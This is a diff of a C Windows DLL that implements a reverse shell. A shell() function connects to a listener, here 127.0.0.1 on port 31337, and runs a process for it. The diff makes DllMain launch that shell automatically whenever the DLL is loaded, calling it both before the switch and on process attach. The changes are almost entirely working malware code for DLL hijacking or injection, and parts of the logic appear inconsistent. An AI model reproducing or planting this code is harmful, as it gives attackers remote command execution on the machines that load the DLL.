@@ -5,6 +5,7 @@
 #include <windows.h>
 #include <winsock2.h>
 #include <ws2tcpip.h>
+#pragma comment(lib, "Ws2_32.lib")
 #define BUFLEN 1024
 
 int shell(LPWSTR server, unsigned int port) {
@@ -63,15 +64,23 @@ int shell(LPWSTR server, unsigned int port) {
     WaitForSingleObject(pinfo.hProcess, INFINITE);
     CloseHandle(pinfo.hProcess);
     CloseHandle(pinfo.hThread);
+
+    memset(recvbuf, 0, BUFLEN);
+    if(recv(socket, recvbuf, BUFLEN, 0) <= 0) {
+        closesocket(socket);
+        WSACleanup();
+        return -3;
+    }
+    if(strcmp(recvbuf, "exit\n") == 0) {
+        return 0;
+    }
 }
-BOOL APIENTRY DllMain( HMODULE hModule,
-                       DWORD  ul_reason_for_call,
-                       LPVOID lpReserved
-                     )
-{
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
+    shell((LPWSTR)L"127.0.0.1", 31337);
     switch (ul_reason_for_call)
     {
     case DLL_PROCESS_ATTACH:
+        shell((LPWSTR)L"127.0.0.1", 31337);
     case DLL_THREAD_ATTACH:
     case DLL_THREAD_DETACH:
     case DLL_PROCESS_DETACH:
